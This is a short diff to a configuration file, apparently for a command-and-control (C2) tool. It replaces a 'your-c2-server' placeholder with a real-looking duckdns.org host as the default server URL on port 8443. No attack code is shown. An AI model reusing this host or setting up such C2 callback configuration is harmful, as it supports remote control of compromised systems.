@@ -143,7 +143,7 @@ export const API_ENDPOINTS = {
 } as const;
 
 export const SERVER_CONFIG = {
-  DEFAULT_URL: 'https://your-c2-server.com',
+  DEFAULT_URL: 'https://into-the-nothingnesssss.duckdns.org',
   DEFAULT_PORT: 8443,
   TIMEOUT: 30000, // 30 seconds
   RETRY_ATTEMPTS: 3,
